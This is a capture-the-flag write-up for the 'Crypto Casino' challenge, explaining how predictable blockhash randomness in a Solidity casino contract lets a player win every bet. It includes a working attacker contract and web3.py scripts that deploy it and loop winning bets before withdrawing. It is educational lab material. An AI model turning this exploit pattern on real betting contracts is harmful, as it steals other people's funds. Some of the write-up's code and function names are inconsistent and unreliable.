# Challenge: *Crypto Casino*

> Come play at the crypto casino and use real crypto(graphy) skills to earn fake crypto(currency) <br />
> Goal: Gain a balance of 1337 DUCoin. <br />

Difficolty: *easy*

The challenge gave the following 2 attachments: 
- [DUCoin.sol](DUCoin.sol)

```Solidity
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20/ERC20.sol";
import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol";

contract DUCoin is ERC20, Ownable {
    constructor() ERC20("DUCoin", "DUC") {}

    function freeMoney(address addr) external onlyOwner {
        _mint(addr, 1337);
    }
}
```
- [Casino.sol](Casino.sol)

```Solidity
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./DUCoin.sol";
import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol";

contract Casino is Ownable {
    DUCoin public immutable ducoin;

    bool trialed = false;
    uint256 lastPlayed = 0;
    mapping(address => uint256) public balances;

    constructor(address token) {
        ducoin = DUCoin(token);
    }

    function deposit(uint256 amount) external {
        ducoin.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance!");
        ducoin.transfer(msg.sender, amount);
        balances[msg.sender] -= amount;
    }

    function _randomNumber() internal view returns(uint8) {
        uint256 ab = uint256(blockhash(block.number - 1));
        uint256 a = ab & 0xffffffff;
        uint256 b = (ab >> 32) & 0xffffffff;
        uint256 x = uint256(blockhash(block.number));
        return uint8((a * x + b) % 6);
    }

    function play(uint256 bet) external {
        require(balances[msg.sender] >= bet, "Insufficient balance!");
        require(block.number > lastPlayed, "Too fast!");
        lastPlayed = block.number;

        uint8 roll = _randomNumber();
        if(roll == 0) {
            balances[msg.sender] += bet;
        } else {
            balances[msg.sender] -= bet;
        }
    }

    function getTrialCoins() external {
        if(!trialed) {
            trialed = true;
            ducoin.transfer(msg.sender, 7);
        }
    }
}
```

The [DUCoin.sol](DUCoin.sol) creates an ERC20 token that is used to do bets in the [Casino.sol](Casino.sol) contract.
Our goal is to get a balance of 1337 DUCoin so we have to find out a way to do winning bets.

The ERC20 token creation is secure and standard: the process is done using OpenZeppelin contracts.

A play is either winning or losing based on the result of the `_randomNumber()` function, that creates randomness using `blockhash(block.number)`, a function that returns the hash of the last block. Because the blockchain is public, everyone can find the hash and predict the value returned by the function `_randomNumber()`.
```Solidity
function _randomNumber() internal view returns(uint8) {
    uint256 ab = uint256(blockhash(block.number - 1));
    uint256 a = ab & 0xffffffff;
    uint256 b = (ab >> 32) & 0xffffffff;
    uint256 x = uint256(blockhash(block.number));
    return uint8((a * x + b) % 6);
}
```

We can develop a Smart Contract that checks wheater a play is winning or losing and in case `_randomNumber()` returns zero (the play is winning), call the `play()` function.
We then repeat this until our balance is greater than 1337.

```Solidity
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./Casino.sol";
import "./DUCoin.sol";

contract ResolveCasino {
    Casino public casino;
    DUCoin public ducoin;
    
    constructor(address addr){
        casino = Casino(addr);
        ducoin = DUCoin(casino.ducoin());

        casino.getTrialCoins();
        ducoin.increaseAllowance(address(this), 7);
        ducoin.increaseAllowance(addr, 7);

        casino.deposit(7);
    }

    function randomNumber() public view returns(uint8) {
        uint256 ab = uint256(blockhash(block.number - 1));
        uint256 a = ab & 0xffffffff;
        uint256 b = (ab >> 32) & 0xffffffff;
        uint256 x = uint256(blockhash(block.number));
        return uint8((a * x + b) % 6);
    }

    function balance() public view returns(uint256){
        return casino.balances(address(this));
    }

    function earnWin() external {

        uint8 roll = randomNumber();
        if(roll == 0) {
            casino.play(casino.balances(address(this)));
        }
    }

    function withdraw(uint256 amount) external {
        require(balance() >= amount, "Insufficient balance!");
        casino.withdraw(amount);
        ducoin.transfer(msg.sender, amount);
    } 

}
```

This smart contract with the function `bidIfWinning()` executes the `play()` function only if `_randomNumber()` returns zero but in case `_randomNumber()` returns a different value we still have to create and send a transaction, this will create a new block and with that a different `blockhash(block.number )`.

First we have to compile and deploy the smart contract in the blockchain provided by the challenge, then call the `bidIfWinning()` solution until `balance()` so the contract balance is greater than 1337.

To deploy a smart contract we first have to obtain its abi and bytecode, that can be found using more complex tool like *Remix IDE* or by compiling the contract with compilers like *solc* that even comes with a python library:
```Python
import solcx

# If you haven't already installed the Solidity compiler (first time using solc), uncomment the following line
# solcx.install_solc()

compiledFile = solcx.compile_files('ResolveCasino.sol')

abi = temp_file['ResolveCasino.sol:ResolveCasino']['abi']
bytecode = temp_file['ResolveCasino.sol:ResolveCasino']['bin']
```
To install solcx library just run: `pip install py-solc-x`.

We can then publish the smart contract on the blockchain by running the following script that interacts with the remove EVM thourgh Web3.py:
```Python
from web3 import Web3
from web3.middleware import geth_poa_middleware
import json

url = "RPC_ENDPOINT_URL_GIVEN"
w3 = Web3(Web3.HTTPProvider(url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
print("Is connected? ", w3.isConnected())

with open("ResolveCasinoABI.json") as f:       #json file with the contract ABI
    ResolveCasinoAbi = json.load(f)
with open("ResolveCasinoBytecode.json") as f:       #json file with the contract Bytecode
    ResolveCasinoBytecode = json.load(f)

account_from = {
    'address': 'PERSONAL_ADDRESS_GIVEN',
    'private_key': 'PRIVATE_KEY_GIVEN',
}
acct = w3.eth.account.privateKeyToAccount(account_from['private_key'])
print(f'Deploying smart contract from account: { account_from["address"] }')
Incrementer = w3.eth.contract(abi=ResolveCasinoAbi, bytecode=ResolveCasinoBytecode['object'])

construct_txn = Incrementer.constructor().buildTransaction({
    'from': account_from['address'],
    'nonce': w3.eth.getTransactionCount(account_from['address']),
    'gas': 1728712,
    'gasPrice': w3.toWei('21', 'gwei')
})

signed = acct.signTransaction(construct_txn)
tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print(f'Contract deployed at address: { tx_receipt.contractAddress }')
```

We can reach a balance greater than 1337 DUC by iterating function `bidIfWinning()` until our balance exceeds 1337 tokens, this code interacts with the *ResolveCasino.sol* developed smart contract and calls `bidIfWinning()`:
```Python
from web3 import Web3
from web3.middleware import geth_poa_middleware
import json

url = "RPC_ENDPOINT_URL_GIVEN"
w3 = Web3(Web3.HTTPProvider(url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
print("Is connected? ", w3.isConnected())

with open("ResolveCasinoABI.json") as f:       #json file with the contract ABI
    ResolveCasinoABI = json.load(f)

personalAddress = "PERSONAL_ADDRESS_GIVEN"
privateKey = "PRIVATE_KEY_GIVEN"
smartContractAddress = w3.toChecksumAddress("SMART_CONTRACT_ADDRESS_DEPLOYED")
setup = w3.eth.contract(address=smartContractAddress, abi = ResolveCasinoABI)

print("Starting Balance: ", setup.functions.balance().call())

def play():
    transaction = setup.functions.earnWin().buildTransaction({
        'gas': 70000,
        'gasPrice': Web3.toWei(40, 'gwei'), 
        'nonce': w3.eth.getTransactionCount(personalAddress)
    })      #Withdraw all the token to the sender address
    signed_txn = w3.eth.account.signTransaction(transaction, private_key=privateKey)
    w3.eth.sendRawTransaction(signed_txn.rawTransaction)
    return setup.functions.balance().call()

i = 1
while(setup.functions.balance().call() < 1337):
    val = play()
    print("Balance at play ", i, ": ", val)
    i += 1

transaction = setup.functions.withdraw(1337).buildTransaction({
    'gas': 100000,
    'gasPrice': w3.toWei(40, 'gwei'), 
    'nonce': w3.eth.getTransactionCount("0xFD391659e29b9eCB2b7c8AC9587eDff3E0ED2AC4")
})      #Withdraw all the token to the sender address
signed_txn = w3.eth.account.signTransaction(transaction, private_key=privateKey)
w3.eth.sendRawTransaction(signed_txn.rawTransaction)
```

We can then retreive the right flag: `DUCTF{sh0uldv3_us3d_a_vrf??}`

<br/>

## Alternative solution

Analizing the function `_randomNumber()` we can understand that the return value depends only on `a` and `b`, so only values that comes from `uint256(blockhash(block.number - 1))`
```Solidity
function _randomNumber() internal view returns(uint8) {
    uint256 ab = uint256(blockhash(block.number - 1));
    uint256 a = ab & 0xffffffff;
    uint256 b = (ab >> 32) & 0xffffffff;
    uint256 x = uint256(blockhash(block.number));
    return uint8((a * x + b) % 6);
}
```

An alternative solution could be retreiving the blockhash using a python script and then evaluate the return value: if it is zero, we call the smart contract function `play()`, otherwise we publish a transaction to create a new block and a new hash. We iterate this process until we reach a DUC balance greater than 1337 DUCoin.
